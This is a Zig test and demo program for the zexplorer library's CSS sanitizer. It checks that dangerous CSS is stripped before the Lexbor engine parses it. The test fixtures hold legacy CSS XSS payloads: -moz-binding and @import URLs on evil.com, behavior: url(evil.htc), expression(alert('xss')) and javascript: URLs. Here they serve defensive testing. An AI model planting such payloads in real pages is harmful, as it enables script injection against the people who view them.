const std = @import("std");
const z = @import("zexplorer");

// =============================================================================
// CSS SANITIZATION PIPELINE TEST
// =============================================================================
//
// This file demonstrates the interaction between TWO SEPARATE CSS systems:
//
// 1. CssSanitizer - Independent string processor that cleans CSS text
//    - sanitizeStyleString() for inline style="" attributes
//    - sanitizeStylesheet() for <style> element content
//    - Works on raw text, outputs cleaned text
//
// 2. Lexbor CSS Engine - Parses and attaches styles to elements
//    - initDocumentCSS() - enables CSS watching on document
//    - createCssStyleParser() + createStylesheet() - for external CSS
//    - loadStyleTags() - finds <style> elements, parses content, attaches
//    - getComputedStyle() - retrieves computed style values from elements
//
// CRITICAL INSIGHT:
// - CssSanitizer modifies DOM text content of <style> elements
// - Lexbor parses the <style> content into internal rule structures
// - If Lexbor parses BEFORE sanitization, it has the OLD (dangerous) CSS
// - Correct order: Sanitize FIRST → Initialize CSS engine → loadStyleTags
//
// =============================================================================

pub fn main() !void {
    const allocator = std.heap.c_allocator;

    z.print("\n============================================================\n", .{});
    z.print("  CSS SANITIZATION PIPELINE TESTS\n", .{});
    z.print("============================================================\n\n", .{});

    try test1_external_stylesheet(allocator);
    try test2_style_block_sanitization(allocator);
    try test3_inline_styles_multi_element(allocator);
    try test4_correct_vs_incorrect_order(allocator);

    z.print("\n============================================================\n", .{});
    z.print("  ALL TESTS COMPLETE\n", .{});
    z.print("============================================================\n", .{});
}

// =============================================================================
// TEST 1: External Stylesheet (simulating a CSS file)
// =============================================================================
// Flow: CSS string → CssSanitizer.sanitizeStylesheet() → parse → attach
// No DOM involvement for the CSS text itself.

fn test1_external_stylesheet(allocator: std.mem.Allocator) !void {
    z.print("--- TEST 1: External Stylesheet Sanitization ---\n\n", .{});

    // Simulated external CSS file content (as if fetched from server)
    const external_css =
        \\.header { color: blue; font-size: 18px; }
        \\.exploit { -moz-binding: url("http://evil.com/xss.xml#xss"); }
        \\.danger { behavior: url(#default#something); }
        \\@import url('https://evil.com/inject.css');
        \\p { margin: 10px; padding: 5px; }
        \\.backdoor { background: url(javascript:alert('xss')); }
    ;

    z.print("BEFORE sanitization:\n{s}\n\n", .{external_css});

    // Step 1: Sanitize the stylesheet string
    var css_san = try z.CssSanitizer.init(allocator, .{});
    defer css_san.deinit();

    const clean_css = try css_san.sanitizeStylesheet(external_css);
    defer allocator.free(clean_css);

    z.print("AFTER sanitization:\n{s}\n", .{clean_css});

    // Step 2: Create document and attach the sanitized stylesheet
    const doc = try z.createDocument();
    defer z.destroyDocument(doc);

    try z.initDocumentCSS(doc, true);
    defer z.destroyDocumentCSS(doc);

    const parser = try z.createCssStyleParser();
    defer z.destroyCssStyleParser(parser);

    const sst = try z.createStylesheet();
    defer z.destroyStylesheet(sst);

    const html = "<html><body><div class=\"header\">Hello</div><p>Paragraph</p></body></html>";
    try z.insertHTML(doc, html);

    // Parse and attach the SANITIZED CSS
    try z.parseStylesheet(sst, parser, clean_css);
    try z.attachStylesheet(doc, sst);

    // Step 3: Verify styles are applied correctly
    if (try z.querySelector(allocator, doc, ".header")) |header| {
        const color = try z.getComputedStyle(allocator, header, "color");
        defer if (color) |c| allocator.free(c);
        z.print("\nComputed color on .header: {s}\n", .{color orelse "(none)"});
    }

    if (try z.querySelector(allocator, doc, "p")) |p| {
        const margin = try z.getComputedStyle(allocator, p, "margin");
        defer if (margin) |m| allocator.free(m);
        z.print("Computed margin on p: {s}\n", .{margin orelse "(none)"});
    }

    z.print("\n✓ External stylesheet: sanitized, parsed, attached\n\n", .{});
}

// =============================================================================
// TEST 2: <style> Block with CSS Engine Integration
// =============================================================================
// Flow: insertHTML → sanitizeWithCss (modifies DOM) → initDocumentCSS → loadStyleTags

fn test2_style_block_sanitization(allocator: std.mem.Allocator) !void {
    z.print("--- TEST 2: <style> Block + CSS Engine ---\n\n", .{});
    z.print("\n✓ <style> block: DOM sanitized BEFORE CSS engine parsed it\n\n", .{});

    const html_with_style =
        \\<html>
        \\<head>
        \\  <style>
        \\    .safe { color: green; font-weight: bold; }
        \\    .dangerous { behavior: url(evil.htc); }
        \\    .also-safe { padding: 20px; margin: 10px; }
        \\  </style>
        \\</head>
        \\<body>
        \\  <div class="safe">Safe element</div>
        \\  <div class="dangerous">Was dangerous</div>
        \\  <div class="also-safe">Also safe</div>
        \\</body>
        \\</html>
    ;

    // CORRECT ORDER:
    // 1. Create document
    const doc = try z.createDocument();
    defer z.destroyDocument(doc);

    // 2. Insert HTML (CSS engine NOT yet watching)
    try z.insertHTML(doc, html_with_style);

    // 3. Show <style> content BEFORE sanitization
    if (try z.querySelector(allocator, doc, "style")) |style_el| {
        z.print("<style> BEFORE sanitization:\n{s}\n\n", .{z.textContent_zc(z.elementToNode(style_el))});
    }

    // 4. Sanitize (modifies the DOM - changes <style> text content)
    var css_san = try z.CssSanitizer.init(allocator, .{});
    defer css_san.deinit();

    try z.sanitizeWithCss(allocator, z.documentRoot(doc).?, .{
        .custom = .{
            .remove_styles = false, // Keep <style> but sanitize content
            .sanitize_inline_styles = true,
        },
    }, &css_san);

    // 5. Show <style> content AFTER sanitization
    const clean_sst_elt = try z.querySelector(allocator, doc, "style");
    const cleaned_sst = z.textContent_zc(z.elementToNode(clean_sst_elt.?));

    if (clean_sst_elt != null) {
        z.print("<style> AFTER sanitization:\n{s}\n\n", .{cleaned_sst});
    }

    // 6. NOW init CSS engine (after sanitization!)
    try z.initDocumentCSS(doc, true);
    defer z.destroyDocumentCSS(doc);

    const sst = try z.createStylesheet();
    defer z.destroyStylesheet(sst);

    // 7. Create parser and load style tags
    const parser = try z.createCssStyleParser();
    defer z.destroyCssStyleParser(parser);
    try z.parseStylesheet(sst, parser, cleaned_sst);

    try z.loadStyleTags(allocator, doc, parser);
    try z.attachStylesheet(doc, sst); // Attach styles to root to propagate

    // 8. Verify computed styles work
    if (try z.querySelector(allocator, doc, ".safe")) |safe| {
        try z.attachElementStyles(safe);
        const color = try z.getComputedStyle(allocator, safe, "color");
        defer if (color) |c| allocator.free(c);
        z.print("Computed color on .safe: {s}\n", .{color orelse "(none)"});
    }

    if (try z.querySelector(allocator, doc, ".dangerous")) |danger| {
        // try z.attachElementStyles(danger);
        const behavior = z.getComputedStyle(allocator, danger, "behavior") catch null;

        defer if (behavior) |b| allocator.free(b);
        z.print("Computed behavior on .dangerous: {s} (should be none)\n\n", .{behavior orelse "(none)"});
    }
}

// =============================================================================
// TEST 3: Inline Styles on Multiple Elements (Good + Bad)
// =============================================================================
// Tests inline style="" attribute sanitization

fn test3_inline_styles_multi_element(allocator: std.mem.Allocator) !void {
    z.print("--- TEST 3: Inline Styles (Good + Bad) ---\n\n", .{});

    const html =
        \\<html><body>
        \\  <div id="div1" style="color: red; background: expression(alert('xss')); border: 1px solid blue;">
        \\    DIV with mixed inline styles
        \\  </div>
        \\  <p id="p1" style="font-size: 16px; behavior: url(evil.htc); margin: 5px;">
        \\    P with mixed inline styles
        \\  </p>
        \\  <span id="span1" style="color: purple; padding: 10px;">
        \\    SPAN with only safe styles
        \\  </span>
        \\</body></html>
    ;

    // const doc = try z.createDocument();
    const doc = try z.parseHTML(allocator, html);
    defer z.destroyDocument(doc);
    // try z.insertHTML(doc, html);

    // Show attributes BEFORE
    z.print("BEFORE sanitization:\n", .{});
    for ([_][]const u8{ "#div1", "#p1", "#span1" }) |sel| {
        if (try z.querySelector(allocator, doc, sel)) |el| {
            const style_attr = z.getAttribute_zc(el, "style") orelse "(none)";
            z.print("  {s} style: \"{s}\"\n", .{ sel, style_attr });
        }
    }

    // Initialize CSS sanitizer and sanitize
    var css_san = try z.CssSanitizer.init(allocator, .{});
    defer css_san.deinit();

    try z.sanitizeWithCss(allocator, z.documentRoot(doc).?, .{
        .custom = .{
            .remove_styles = false,
            .sanitize_inline_styles = true,
        },
    }, &css_san);

    // Show attributes AFTER
    z.print("\nAFTER sanitization:\n", .{});
    for ([_][]const u8{ "#div1", "#p1", "#span1" }) |sel| {
        if (try z.querySelector(allocator, doc, sel)) |el| {
            const style_attr = z.getAttribute_zc(el, "style") orelse "(none)";
            z.print("  {s} style: \"{s}\"\n", .{ sel, style_attr });
        }
    }

    // Now init CSS engine for getComputedStyle
    try z.initDocumentCSS(doc, true);
    defer z.destroyDocumentCSS(doc);

    // For inline styles to be visible to getComputedStyle after
    // sanitization, we need to re-parse them
    z.print("\nComputed styles (after CSS engine init):\n", .{});
    for ([_][]const u8{ "#div1", "#p1", "#span1" }) |sel| {
        if (try z.querySelector(allocator, doc, sel)) |el| {
            // Re-parse the (now sanitized) style attribute
            try z.parseElementStyle(el);

            const color = try z.getComputedStyle(allocator, el, "color");
            defer if (color) |c| allocator.free(c);
            z.print("  {s} color: {s}\n", .{ sel, color orelse "(none)" });
        }
    }

    z.print("\n✓ Inline styles: dangerous properties removed, safe ones preserved\n\n", .{});
}

// =============================================================================
// TEST 4: Correct vs Incorrect Order
// =============================================================================
// Demonstrates what happens when you do things in the wrong order

fn test4_correct_vs_incorrect_order(allocator: std.mem.Allocator) !void {
    z.print("--- TEST 4: Order Matters! ---\n\n", .{});

    const html =
        \\<html>
        \\<head>
        \\  <style>
        \\    .target { color: red; behavior: url(evil.htc); }
        \\  </style>
        \\</head>
        \\<body>
        \\  <div class="target">Target element</div>
        \\</body>
        \\</html>
    ;

    // --- INCORRECT ORDER (what NOT to do) ---
    z.print("INCORRECT ORDER (CSS engine BEFORE sanitization):\n", .{});
    {
        const doc = try z.createDocument();
        defer z.destroyDocument(doc);

        // ❌ Wrong: Init CSS engine first
        try z.initDocumentCSS(doc, true);
        defer z.destroyDocumentCSS(doc);

        // Insert HTML - CSS engine is already watching
        try z.insertHTML(doc, html);

        // Load style tags - Lexbor now has the DANGEROUS CSS in memory!
        const parser = try z.createCssStyleParser();
        defer z.destroyCssStyleParser(parser);
        try z.loadStyleTags(allocator, doc, parser);

        // Now sanitize - this modifies DOM text, but Lexbor already parsed it!
        var css_san = try z.CssSanitizer.init(allocator, .{});
        defer css_san.deinit();
        try z.sanitizeWithCss(allocator, z.documentRoot(doc).?, .{
            .custom = .{ .remove_styles = false, .sanitize_inline_styles = true },
        }, &css_san);

        // Show what's in the DOM (sanitized)
        if (try z.querySelector(allocator, doc, "style")) |style_el| {
            z.print("  <style> DOM text: {s}\n", .{z.textContent_zc(z.elementToNode(style_el))});
        }
        if (try z.querySelector(allocator, doc, ".target")) |target| {
            try z.attachElementStyles(target);
            const color = try z.getComputedStyle(allocator, target, "color");
            defer if (color) |c| allocator.free(c);
            z.print("  Computed color: {s}\n", .{color orelse "(none)"});

            const behavior = try z.getComputedStyle(allocator, target, "behavior");
            defer if (behavior) |b| allocator.free(b);
            z.print("  Computed behavior: {s} (DANGEROUS - is present!!)\n", .{behavior orelse "(none)"});
            const behavior_attr = z.getAttribute_zc(target, "behavior") orelse "(none)";
            z.print("  but behavior attribute is NO more here: {s}\n", .{behavior_attr});
            z.print("  ⚠️  the Lexbor CSS is no more in sync!\n", .{});
        }

        // But Lexbor still has the old parsed rules!
        // (This is the architectural mismatch)
        z.print("  ⚠️  Lexbor CSS engine still has pre-sanitization rules cached\n", .{});
    }

    // --- CORRECT ORDER ---
    z.print("\nCORRECT ORDER (sanitize BEFORE CSS engine):\n", .{});
    {
        const doc = try z.createDocument();
        defer z.destroyDocument(doc);

        // ✓ 1. Insert HTML first (no CSS engine yet)
        try z.insertHTML(doc, html);

        // ✓ 2. Sanitize (cleans the DOM text)
        var css_san = try z.CssSanitizer.init(allocator, .{});
        defer css_san.deinit();
        try z.sanitizeWithCss(allocator, z.documentRoot(doc).?, .{
            .custom = .{ .remove_styles = false, .sanitize_inline_styles = true },
        }, &css_san);

        // ✓ 3. NOW init CSS engine
        try z.initDocumentCSS(doc, true);
        defer z.destroyDocumentCSS(doc);

        // ✓ 4. Load style tags - Lexbor parses the SANITIZED content
        const parser = try z.createCssStyleParser();
        defer z.destroyCssStyleParser(parser);
        try z.loadStyleTags(allocator, doc, parser);

        // Show what's in the DOM
        if (try z.querySelector(allocator, doc, "style")) |style_el| {
            z.print("  <style> DOM text: {s}\n", .{z.textContent_zc(z.elementToNode(style_el))});
        }

        // Verify computed style is safe
        if (try z.querySelector(allocator, doc, ".target")) |target| {
            try z.attachElementStyles(target);
            const color = try z.getComputedStyle(allocator, target, "color");
            defer if (color) |c| allocator.free(c);
            z.print("  Computed color: {s}\n", .{color orelse "(none)"});

            const behavior = try z.getComputedStyle(allocator, target, "behavior");
            defer if (behavior) |b| allocator.free(b);
            z.print("  Computed behavior: {s} (should be none)\n", .{behavior orelse "(none)"});
        }

        z.print("  ✓ Lexbor CSS engine has ONLY the sanitized rules\n", .{});
    }

    z.print("\n", .{});
    z.print("┌────────────────────────────────────────────────────────┐\n", .{});
    z.print("│  CORRECT ORDER SUMMARY:                                │\n", .{});
    z.print("│                                                        │\n", .{});
    z.print("│  1. createDocument()                                   │\n", .{});
    z.print("│  2. insertHTML(doc, html)                              │\n", .{});
    z.print("│  3. sanitizeWithCss(...)  ← cleans DOM text            │\n", .{});
    z.print("│  4. initDocumentCSS(doc, true)                         │\n", .{});
    z.print("│  5. loadStyleTags(...)    ← parses CLEAN text          │\n", .{});
    z.print("│  6. attachElementStyles() / getComputedStyle()         │\n", .{});
    z.print("└────────────────────────────────────────────────────────┘\n", .{});
}
